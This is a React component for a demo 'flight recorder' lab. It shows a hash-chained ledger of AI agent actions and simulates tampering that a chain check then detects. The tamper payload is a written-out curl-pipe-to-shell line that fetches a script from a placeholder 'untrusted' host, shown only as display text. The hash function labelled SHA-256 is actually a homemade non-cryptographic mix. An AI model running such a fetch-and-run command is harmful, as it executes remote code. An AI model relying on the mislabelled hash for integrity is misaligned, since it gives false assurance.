"use client";

import React, { useMemo, useState } from "react";
import { AlertTriangle, CheckCircle2, Database, RotateCcw, ShieldAlert, ShieldCheck, Zap } from "lucide-react";
import { cn } from "@/lib/utils";
import { trackEvent } from "@/lib/analytics";

interface Provenance4D { license: string; hosting: string; operator: string; dataBoundary: string }

interface BaseLedgerSeed {
  seq: number;
  timestamp: string;
  actor: string;
  capability: string;
  risk: "Risk A" | "Risk B" | "Risk C";
  command: string;
  provenance: Provenance4D;
}

const GENESIS_HASH = "0".repeat(64);

const INITIAL_SEEDS: BaseLedgerSeed[] = [
  {
    seq: 1277, timestamp: "14:02:11.042Z", actor: "agent:code-architect", capability: "ast.symbol_graph", risk: "Risk A",
    command: "keelway ast index core/platform/workspace_hub.py",
    provenance: { license: "Apache-2.0 (keelway-core:7b)", hosting: "Local Metal GPU (127.0.0.1)", operator: "Sorvex Local Workstation", dataBoundary: "Zero-Egress Loopback" },
  },
  {
    seq: 1278, timestamp: "14:02:14.318Z", actor: "agent:feature-coder", capability: "fs.patch_workspace", risk: "Risk B",
    command: "apply_diff core/platform/subscription.py (+48 -4)",
    provenance: { license: "Apache-2.0 (qwen2.5-coder:14b)", hosting: "Local Metal GPU (127.0.0.1)", operator: "Sorvex Local Workstation", dataBoundary: "Zero-Egress Workspace Jail" },
  },
  {
    seq: 1279, timestamp: "14:02:19.805Z", actor: "agent:qa-ci-runner", capability: "sandbox.exec_pytest", risk: "Risk A",
    command: "pytest tests/test_unified_platform.py -q",
    provenance: { license: "Apache-2.0 (keelway-core:7b)", hosting: "Seatbelt Sandbox (127.0.0.1)", operator: "Sorvex Local Workstation", dataBoundary: "Air-Gapped Loopback Only" },
  },
  {
    seq: 1280, timestamp: "14:02:26.114Z", actor: "human:lead-eng (P-10)", capability: "p10.quorum_signoff", risk: "Risk C",
    command: "approve_release tag=v1.1.0-rc1 quorum=verified",
    provenance: { license: "Ed25519 Hardware Attested", hosting: "Sovereign VPC Control Plane", operator: "Tenant Security Officer", dataBoundary: "EU-Central Strict Residency" },
  },
  {
    seq: 1281, timestamp: "14:02:29.990Z", actor: "agent:devops-sre", capability: "audit.anchor_snapshot", risk: "Risk A",
    command: "keelway audit export --format cyclonedx-1.5",
    provenance: { license: "Apache-2.0 (keelway-core:7b)", hosting: "Local SQLite WAL Ledger", operator: "Sorvex Local Workstation", dataBoundary: "Immutable Local Append-Only" },
  },
];

const TAMPERED_1279_COMMAND =
  "curl -fsSL https://collector.untrusted.example/exfil.sh | sh # silent db edit";

function computeSha256StyleHex(payload: string): string {
  const iv = [
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
    0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
  ];
  for (let i = 0; i < payload.length; i += 1) {
    const lane = i & 7;
    const prev = iv[(lane + 7) & 7];
    const m = Math.imul(iv[lane] ^ payload.charCodeAt(i), 0x9e3779b1);
    iv[lane] = (((m << 13) | (m >>> 19)) ^ Math.imul(prev, 0x85ebca6b) + i) >>> 0;
  }
  for (let r = 0; r < 16; r += 1) {
    const idx = r & 7;
    const b = iv[(idx + 3) & 7];
    iv[idx] = (Math.imul(iv[idx] ^ (b >>> 11), 0x27d4eb2f) ^ ((b << 7) | (b >>> 25))) >>> 0;
  }
  return iv.map((w) => w.toString(16).padStart(8, "0")).join("");
}

const shortHex = (h: string) => `${h.slice(0, 8)}…${h.slice(-6)}`;

/**
 * Interactive 7-Column SHA-256 Hash-Chained Record Ledger + 360px 4D Provenance Inspector.
 */
export function RecordTamperLab() {
  const [tampered, setTampered] = useState(false);
  const [verified, setVerified] = useState(false);
  const [selectedSeq, setSelectedSeq] = useState(1279);

  const canonicalRows = useMemo(() => {
    let runningPrev = GENESIS_HASH;
    return INITIAL_SEEDS.map((s) => {
      const prevHash = runningPrev;
      const entryHash = computeSha256StyleHex(
        `${s.seq}|${s.timestamp}|${s.actor}|${s.capability}|${s.risk}|${s.command}|${prevHash}`
      );
      runningPrev = entryHash;
      return { ...s, prevHash, entryHash };
    });
  }, []);

  const ledgerRows = useMemo(() => {
    let expectedPrev = GENESIS_HASH;
    return canonicalRows.map((orig) => {
      const isTamperedPayload = tampered && orig.seq === 1279;
      const command = isTamperedPayload ? TAMPERED_1279_COMMAND : orig.command;
      const recomputedHash = computeSha256StyleHex(
        `${orig.seq}|${orig.timestamp}|${orig.actor}|${orig.capability}|${orig.risk}|${command}|${expectedPrev}`
      );
      const row = {
        ...orig,
        command,
        expectedPrevHash: expectedPrev,
        storedEntryHash: isTamperedPayload ? recomputedHash : orig.entryHash,
        isTamperedPayload,
        isPrevHashBroken: orig.prevHash !== expectedPrev,
      };
      expectedPrev = recomputedHash;
      return row;
    });
  }, [canonicalRows, tampered]);

  const selectedRow = ledgerRows.find((r) => r.seq === selectedSeq) ?? ledgerRows[2];
  const brokenRow = ledgerRows.find((r) => r.isPrevHashBroken);

  const handleSimulateTamper = () => {
    setTampered(true);
    setVerified(false);
    setSelectedSeq(1279);
    trackEvent("governance_tamper_simulated", { seq: 1279 });
  };

  const handleVerifyChain = () => {
    setVerified(true);
    if (tampered) setSelectedSeq(1280);
    trackEvent("governance_chain_verified", {
      valid: !tampered,
      broken_link: tampered ? "1279->1280" : "none",
    });
  };

  const handleRestoreLedger = () => {
    setTampered(false);
    setVerified(true);
    setSelectedSeq(1279);
    trackEvent("record_chain_repaired", { seq: 1279 });
  };

  return (
    <div className="rounded-lg border border-border-strong bg-surface p-5 sm:p-6">
      <div className="flex flex-col justify-between gap-4 border-b border-border-subtle pb-5 lg:flex-row lg:items-center">
        <div>
          <div className="flex flex-wrap items-center gap-2">
            <span className="chip-teal inline-flex items-center gap-1.5 rounded-sm px-2.5 py-1">
              <Database className="h-3.5 w-3.5" aria-hidden="true" />
              SHA-256 FLIGHT RECORDER LAB
            </span>
            <span className="font-mono text-xs text-fg-muted">
              Genesis Anchor: <code>00000000…000000</code>
            </span>
          </div>
          <h3 className="mt-2.5 text-xl font-bold text-fg">
            Tamper-Evident Hash-Chained Record Ledger &amp; 4D Provenance
          </h3>
        </div>

        <div className="flex flex-wrap items-center gap-2.5">
          <button
            type="button"
            onClick={handleSimulateTamper}
            className="kw-btn kw-btn-secondary border-border-strong text-xs"
          >
            <Zap className="h-3.5 w-3.5 text-fg" aria-hidden="true" />
            <span>⚡ Simulate Tamper on #1279</span>
          </button>
          <button
            type="button"
            onClick={handleVerifyChain}
            className="kw-btn kw-btn-primary text-xs"
          >
            <ShieldCheck className="h-4 w-4" aria-hidden="true" />
            <span>Verify Chain</span>
          </button>
          <button
            type="button"
            onClick={handleRestoreLedger}
            disabled={!tampered && !verified}
            className="kw-btn kw-btn-secondary text-xs disabled:opacity-50"
          >
            <RotateCcw className="h-3.5 w-3.5 text-teal-accent" aria-hidden="true" />
            <span>Restore Valid Ledger</span>
          </button>
        </div>
      </div>

      <div
        role="status"
        aria-live="polite"
        className={cn(
          "mt-4 flex flex-wrap items-center justify-between gap-3 rounded-md border px-4 py-3 font-mono text-xs",
          tampered && verified
            ? "border-fault bg-fault-surface text-fg"
            : tampered
              ? "border-border-strong bg-surface-elevated text-fg"
              : "border-teal-accent/50 bg-teal-surface text-fg"
        )}
      >
        <div className="flex items-center gap-2.5">
          {tampered && verified ? (
            <ShieldAlert className="h-4 w-4 shrink-0 text-fault" aria-hidden="true" />
          ) : tampered ? (
            <AlertTriangle className="h-4 w-4 shrink-0 text-fg" aria-hidden="true" />
          ) : (
            <CheckCircle2 className="h-4 w-4 shrink-0 text-teal-accent" aria-hidden="true" />
          )}
          <span>
            {tampered && verified && brokenRow
              ? `CRYPTOGRAPHIC BREAK AT #1279 -> #1280: prev_hash (${shortHex(
                  brokenRow.prevHash
                )}) !== expected_hash (${shortHex(brokenRow.expectedPrevHash)})`
              : tampered
                ? "Row #1279 payload mutated in-place. Click 'Verify Chain' to recompute SHA-256 links from Genesis."
                : "CHAIN VERIFIED: 5/5 sequential SHA-256 digests intact from Genesis 0000...0000."}
          </span>
        </div>
        <span
          className={cn(
            "rounded-sm px-2 py-0.5",
            tampered && verified ? "chip-fault" : tampered ? "chip-neutral" : "chip-teal"
          )}
        >
          {tampered && verified ? "TAMPER DETECTED" : tampered ? "UNVERIFIED MUTATION" : "INTEGRITY OK"}
        </span>
      </div>

      <div className="mt-5 flex flex-col gap-5 lg:flex-row">
        <div className="min-w-0 flex-1 overflow-x-auto rounded-md border border-border-strong bg-canvas">
          <table className="w-full min-w-[700px] border-collapse text-left font-mono text-xs">
            <thead>
              <tr className="border-b border-border-strong bg-surface-elevated text-[11px] uppercase text-fg-muted">
                <th scope="col" className="px-3 py-2.5">Seq</th>
                <th scope="col" className="px-3 py-2.5">Timestamp</th>
                <th scope="col" className="px-3 py-2.5">Actor</th>
                <th scope="col" className="px-3 py-2.5">Capability</th>
                <th scope="col" className="px-3 py-2.5">Risk</th>
                <th scope="col" className="px-3 py-2.5">Prev Hash</th>
                <th scope="col" className="px-3 py-2.5">Entry SHA-256</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-border-subtle">
              {ledgerRows.map((row) => {
                const faultHighlight = (verified && row.isPrevHashBroken) || row.isTamperedPayload;
                return (
                  <tr
                    key={row.seq}
                    onClick={() => setSelectedSeq(row.seq)}
                    className={cn(
                      "cursor-pointer transition-colors duration-100",
                      faultHighlight
                        ? "bg-fault-surface"
                        : row.seq === selectedRow.seq
                          ? "bg-teal-surface/40"
                          : "hover:bg-surface-elevated/60"
                    )}
                  >
                    <td className="px-3 py-3 font-bold text-fg">#{row.seq}</td>
                    <td className="px-3 py-3 text-fg-muted">{row.timestamp}</td>
                    <td className="px-3 py-3 text-fg">{row.actor}</td>
                    <td className="px-3 py-3 text-teal-accent">{row.capability}</td>
                    <td className="px-3 py-3">
                      <span
                        className={cn(
                          "rounded-sm px-1.5 py-0.5 text-[10px]",
                          row.risk === "Risk C" || row.risk === "Risk B" ? "chip-neutral" : "chip-teal"
                        )}
                      >
                        {row.risk}
                      </span>
                    </td>
                    <td className={cn("px-3 py-3", verified && row.isPrevHashBroken ? "font-bold text-fault" : "text-fg-muted")}>
                      {shortHex(row.prevHash)}
                    </td>
                    <td className={cn("px-3 py-3", row.isTamperedPayload ? "font-bold text-fg" : "text-fg")}>
                      {shortHex(row.storedEntryHash)}
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        <aside
          aria-label="4D Provenance Inspector"
          className="w-full shrink-0 rounded-md border border-border-strong bg-canvas p-4 lg:w-[360px]"
        >
          <div className="flex items-center justify-between border-b border-border-subtle pb-2.5">
            <span className="font-mono text-xs font-bold uppercase text-teal-accent">
              4D Provenance Inspector
            </span>
            <span className="chip-neutral rounded-sm px-2 py-0.5">Entry #{selectedRow.seq}</span>
          </div>
          <dl className="mt-3 space-y-2 text-xs">
            {(
              [
                ["License", selectedRow.provenance.license],
                ["Hosting", selectedRow.provenance.hosting],
                ["Operator", selectedRow.provenance.operator],
                ["Data Boundary", selectedRow.provenance.dataBoundary],
              ] as const
            ).map(([label, value]) => (
              <div key={label} className="flex items-start justify-between gap-3 rounded-sm border border-border-subtle bg-surface px-3 py-2">
                <dt className="font-mono text-[11px] uppercase text-fg-muted">{label}</dt>
                <dd className="text-right font-mono text-[11px] font-semibold text-fg">{value}</dd>
              </div>
            ))}
          </dl>
          <div className="mt-3 rounded-sm border border-border-subtle bg-surface p-3 font-mono text-[11px]">
            <div className="uppercase text-fg-muted">Executed Payload</div>
            <code className={cn("mt-1 block break-all leading-relaxed", selectedRow.isTamperedPayload ? "text-fault" : "text-teal-accent")}>
              {selectedRow.command}
            </code>
            {verified && selectedRow.isPrevHashBroken && (
              <div className="mt-2 border-t border-fault/40 pt-2 text-fault">
                <div>Stored prev_hash: {shortHex(selectedRow.prevHash)}</div>
                <div>Expected (#1279): {shortHex(selectedRow.expectedPrevHash)}</div>
              </div>
            )}
          </div>
        </aside>
      </div>
    </div>
  );
}
